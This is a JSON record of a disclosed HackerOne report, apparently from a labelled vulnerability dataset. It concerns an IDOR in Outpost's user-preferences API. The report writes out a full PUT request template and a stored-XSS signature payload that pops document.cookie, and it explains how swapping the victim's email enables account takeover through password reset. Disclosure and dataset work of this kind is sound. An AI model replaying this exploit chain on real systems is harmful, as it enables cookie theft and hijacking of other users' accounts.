{
  "reported_to": "Palo Alto Software",
  "reported_by": "macasun ",
  "title": "IDOR on update user preferences",
  "content": "\nSummary:\nTeam member with role USER can change data of any user in the team, or steal his cookies, or steal the account of victim via forget password function.\nSteps To Reproduce:\nLogin in as user1 (the user with role admin) and invite user2 (set his role to user).\nLogin in as user2, open Mail tab and select user1 from Conversation assignment dropdown (see s1.jpg (F796149) attachment).\nOpen network tools in the browser devTools or open local proxy and copy UserUuid (da4f313f-e21e-4b5f-b2da-42d9864716f6 in my case) of the user1 from the following request: https://api.outpost.co/api/v1/conversation/assigned?assignedToUserUuid=da4f313f-e21e-4b5f-b2da-42d9864716f6.\nUse template request1 to create http request. Change {user1-uuid} to user1 Uuid, {user2-cookie} to user2 cookie. In the request body: {attacker-email} to email controlled by user2, signature to the following: <p style=\\\"margin:0;\\\">User Signature2<img src=x onerror=alert(document.cookie) ></p>. Send request.\nLogin in as user1. Open https://app.outpost.co/settings/preferences, alert with user1 cookie will appear (see s2.jpg (F796148) attachment).\nOpen https://app.outpost.co/sign-in/help and paste {attacker-email}. Open email client, click the link to restore password, enter a new password. Now you can login in using user1 email address and password entered on the previos step.\nSupporting Material/References:\nrequest1 template:\nCode 896 Bytes\n1PUT /api/v1/user/preferences/{user1-uuid} HTTP/2.0\n2Host: api.outpost.co\n3Content-Length: 434\n4Sec-Fetch-Dest: empty\n5X-Requested-With: XMLHttpRequest\n6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36\n7Dnt: 1\n8Content-Type: application/json\n9Accept: */*\n10Origin: https://app.outpost.co\n11Sec-Fetch-Site: same-site\n12Sec-Fetch-Mode: cors\n13Referer: https://app.outpost.co/\n14Accept-Encoding: gzip, deflate, br\n15Accept-Language: ru-RU, ru;q=0.9, en-US;q=0.8, en;q=0.7\n16Cookie: auth={user2-cookie}\n17\n18{\n19  \"firstName\": \"user1-changed-by-user2\",\n20  \"lastName\": \"null\",\n21  \"email\": \"{attacker-email}\",\n22  \"role\": \"USER\",\n23  \"defaultMailboxUuid\": \"\",\n24  \"mailboxUuids\": [\n25    \"e4a63ae3-bb10-46f8-be28-a2660a2344ec\"\n26  ],\n27  \"signature\": \"{signature}\",\n28  \"timezone\": \"Europe/Moscow\",\n29  \"defaultSendAndResolve\": false,\n30  \"selectFirstConversation\": true\n31}\nImpact\nAn attacker can change data of any user in the team, or steal his cookies, or steal account of victim via forget password function.\n\n",
  "severity": [
    10.0,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Insecure Direct Object Reference (IDOR)"
  ],
  "screenshots": {},
  "disclosed_date": 1589413920,
  "report_url": "https://hackerone.com/reports/854290",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Login as user1 (admin) and invite user2 with USER role."
    ],
    [
      2,
      "Login as user2, access Mail tab, and select user1 from Conversation assignment dropdown."
    ],
    [
      3,
      "Extract user1's UserUuid from the network request."
    ],
    [
      4,
      "Use the template request to send a PUT request to update user1's preferences, including a malicious signature."
    ],
    [
      5,
      "Login as user1 and trigger the XSS payload to steal cookies."
    ],
    [
      6,
      "Use the forget password function with the attacker's email to hijack user1's account."
    ]
  ],
  "vuln_description": "An Insecure Direct Object Reference (IDOR) vulnerability allows a user with USER role to modify any user's preferences, including injecting malicious scripts to steal cookies or hijack accounts via the password reset function.",
  "reason": "The attack involves multiple steps including session manipulation, XSS payload injection, and account takeover via password reset. The interaction between these components is non-obvious, requiring the attacker to understand and chain several vulnerabilities together.",
  "new_complexity": "HIGH",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": true,
  "authnz_byppass_detectable": true,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves an authenticated user (user2) performing actions on another user's (user1) resources by manipulating the user UUID in API requests. This fits the IDOR detection methodology where (user_session, action, resource_id) tuples are tested by swapping user sessions and resource IDs. The methodology would capture the unauthorized update of user preferences and the subsequent cookie theft and account takeover via password reset.",
    "is_detectable": true
  }
}